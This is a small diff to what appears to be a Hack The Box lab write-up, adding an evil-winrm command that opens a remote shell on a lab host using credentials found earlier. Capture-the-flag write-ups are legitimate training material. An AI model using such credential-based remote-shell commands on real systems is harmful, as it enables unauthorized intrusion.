@@ -173,3 +173,6 @@ crackmapexec winrm 10.10.11.106 -u tony -p liltony
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7f13374d-bbc0-4d34-b183-3a397bed36e5)
 
 EvilWinRM
+```CSS
+evil-winrm -i 10.10.11.106 -u tony -p liltony -s scripts -e exes
+```
